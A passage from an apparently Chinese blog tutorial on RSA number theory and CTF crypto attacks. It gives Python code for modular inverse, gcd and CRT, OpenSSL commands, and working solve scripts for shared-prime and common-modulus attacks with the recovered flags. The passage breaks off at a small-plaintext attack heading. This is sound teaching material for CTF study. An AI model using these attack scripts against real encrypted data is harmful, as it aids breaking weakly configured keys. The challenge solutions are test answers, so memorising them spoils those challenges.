<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod</span><span class="params">(c,d,n)</span>:</span><span class="comment">#等价于自带的pow(c,d,n)</span></span><br><span class="line">    r=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> d&gt;<span class="number">0</span>:</span><br><span class="line">        c=c%n</span><br><span class="line">        <span class="keyword">if</span> d&amp;<span class="number">1</span>:</span><br><span class="line">            r=(r*c)%n</span><br><span class="line">        d&gt;&gt;=<span class="number">1</span></span><br><span class="line">        c=(c*c)%n</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure>
</li>
<li><p>模逆运算（就是求逆元，主要基于扩展欧几里得算法）</p>
<ul>
<li><p>python实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) 	 <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b 				<span class="comment">#求a模b得逆元</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>出来通过自己编写实现之外还可以通过gmpy2和libnum这两个库函数实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  libnum <span class="keyword">import</span> invmod</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">print</span> invmod(<span class="number">47</span>,<span class="number">30</span>)</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(<span class="number">47</span>,<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535852949.7.png" alt></p>
</li>
</ul>
</li>
<li><p>欧几里得算法：就是求最大公约数，<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code> 和 <code>gcd(a,0)==a</code>有递归实现和迭代实现两种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
</li>
<li><p>扩展欧几里得算法：本质上就是将欧几里得算法求最大公约数的过程最后转化为线性表达式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure>
</li>
<li><p>中国剩余定理，也叫孙子定理：用来求同于方程组（这里在数论中做题不复杂，一到代码是真的复杂）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535853531.62.png" alt></p>
<p>直接贴上大佬的代码：（解决了互质与不互质两种情况）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="应用中一些函数、模块的支撑"><a href="#应用中一些函数、模块的支撑" class="headerlink" title="应用中一些函数、模块的支撑"></a>应用中一些函数、模块的支撑</h3><blockquote>
<p>这里不得不感慨python的强大与方便，提供了gmpy2库、libnum库、pycrypto模块等第三方库，避免了从底层一步一步的写代码（其实也是太菜了，这种基于数论的代码是真的写不出来）</p>
</blockquote>
<ul>
<li><p>gmpy2库、libnum库，主要提供各种数学运算的函数库，向求逆元，取模等运算直接调运函数就可以，很便捷</p>
</li>
<li><p>关于两个库的说明链接如下：</p>
</li>
</ul>
<ul>
<li>pycrypto模块是python中来处理加密解密等信息安全相关的一个重要模块，提供了对称加密、非对称加密、散列哈希的一些计算方法，满足我们在密码学应用上的使用，就RSA可以实现公私钥的提取，生成，利用公私钥进行加解密等，之前写过的一篇文章有介绍</li>
</ul>
<ul>
<li><p>关于RSA中n的分解：</p>
<p>有在线分解：[]:<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>  </p>
<p>离线的[yafu]:<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a>   （p,q相差较大或较小时可快速分解）</p>
</li>
<li><p>除了用代码，还可以用OpenSSL对一些标准格式的RSA加解密</p>
<p>使用OpenSSL提取公钥信息：<code>openssl rsa -pubin -in (文件名) -text</code></p>
<p>使用OpenSSL提取私钥信息：<code>openssl rsa -in (文件名) -text</code></p>
<p>使用OpenSSL进行公钥加密：<code>openssl rsautl -encrypt -in test -out test.enc -inkey asn1pub.pem -pubin</code></p>
<p>使用OpenSSL进行私钥解密：<code>openssl rsautl -decrypt -in test.enc -out test.dec -inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行私钥签名：<code>openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行公钥验证：<code>openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin</code></p>
</li>
</ul>
<h3 id="一些实际的应用："><a href="#一些实际的应用：" class="headerlink" title="一些实际的应用："></a>一些实际的应用：</h3><ul>
<li><p>RSA直接解密：</p>
<p>若已知私钥d，则可以直接解密： <code>m=pow(c,d,n)</code> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p:<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddL</span></span><br><span class="line"></span><br><span class="line">q:<span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873L</span></span><br><span class="line"></span><br><span class="line">e:<span class="number">0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85L</span></span><br><span class="line"></span><br><span class="line">d:<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L</span> </span><br><span class="line"></span><br><span class="line">c:<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9L</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9</span></span><br><span class="line">d=<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5</span></span><br><span class="line">n=<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebedd</span> * <span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873</span></span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:len(hex(m))<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>若已知质数p和q，则通过依次计算欧拉函数、私钥d可解密。实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) 	<span class="comment">#求e模phi的逆</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
<p>在选取加密指数e时要求phi，e互质，也就是<code>gcd(phi,e)==1</code> ，如果不满足是无法直接解密的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259</span><br><span class="line">tell me the smallest answer of x</span><br><span class="line">n = 3436415358139016629092568198745009225773259=3881 · 885445853681787330351086884500131209939</span><br><span class="line">e = 33</span><br><span class="line">c = 1926041757553905692219721422025224638913707</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">gcd(phi,33)==3 -&gt; e = 11</span><br><span class="line">n分解以后不满足互素的要求，先用逆元11得到x^3的值,然后爆破X</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">1926041757553905692219721422025224638913707</span></span><br><span class="line">n = <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">e = <span class="number">33</span></span><br><span class="line">p = <span class="number">3881</span></span><br><span class="line">q = <span class="number">885445853681787330351086884500131209939</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = libnum.invmod(e/<span class="number">3</span>, phi)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">x3 = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> x3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(i)</span>:</span></span><br><span class="line">    x, b = gmpy2.iroot(x3 + i *n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    calc(j)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535857638.43.png" alt></p>
</li>
<li><p>模不互质（<code>gcd(N1,N2)!=1</code>）适用情况：存在两个或更多模数，且<code>gcd(N1,N2)!=1</code> 多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一<code>gcd(N1,N2)</code> ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。</p>
</li>
<li><p>共模攻击：适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。</p>
<p>python实现的证明代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure>
<p>Xman-RSA(这道题利用了共模攻击和模不互素)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure>
<p>n2，n3已知，利用共模攻击得到n1，由<code>gcd(n1,n2)==p1</code> 分解n1，n2得到flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># 通过共模攻击得到n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2有一个共有质因数p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure>
<p> RSA-CRYPTO(有两个公钥文件和两个flag文件。提取公钥对比，n相同且可解密，共模攻击)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./pubkey2.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">     key = RSA.importKey(f)</span><br><span class="line">     n = key.n</span><br><span class="line">     e = key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (n)</span><br><span class="line"><span class="keyword">print</span> (e)</span><br><span class="line"><span class="comment">#提取两个公钥都是这个脚本</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535858774.6.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#共模攻击</span></span><br><span class="line">n =  <span class="number">0x8989a398988456b3fef4a6ad86df3c99577f8978048de5436befc30d8d8c94958912aa526ff333b66857306ebb8de36c2c396a84efdc5d382502daa1a3f3b6e97502d2e31c849330f5b4c95257a149a97f5954eaf89341147adcdd4e950fff74e30bbe622876b42eeac86df4ad9715d05b5604aa8179424c7d9ac46bd6b5f322b2b5728ba148704a25a8efcc1e7c84ea7e5ce3e01703f04f94a431d9954bd7ae2c7dd6e879b35f8a2d4a5efbe737257bf99bd9ee66b15aff233fc77b558a487da5952fbe2b923da9c5eb46788c050336b7e36a5ed82d5c1b2aeb0e45bee405cbe72481db2568aa829eeac87d201a5a8ff5ee6f0be38192ab2839635f6c664217L</span></span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag1.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher1 =  f.read()</span><br><span class="line">    cipher1 = b64decode(cipher1).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher1 = string.atoi(cipher1,base = <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag2.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher2 = f.read()</span><br><span class="line">    cipher2 = b64decode(cipher2).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher2 = string.atoi(cipher2,base = <span class="number">16</span>)  <span class="comment">#将字符串转为整型数字,base 指定进制</span></span><br><span class="line"></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)        <span class="comment">#返回一个三元素的元组 g == gcd（a，b）和g == a * s + b * t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    cipher1 = gmpy2.invert(cipher1,n)   <span class="comment">#求cipher1模n的逆(求逆元)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    cipher2 = gmpy2.invert(cipher2,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#powmod（x，y，m）返回（x ** y）mod m。指数y可以是负数，如果x mod m的逆存在，则返回正确的结果。否则，引发ValueError</span></span><br><span class="line">plain = gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(plain)</span><br></pre></td></tr></table></figure>
</li>
<li><p>小明文攻击：适用情况：e较小，一般为3。公钥e很小，明文m也不大的话，于是<code>m^e=k*n+m</code> 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p>
<p>Jarvis OJ Extremely hard RSA</p>
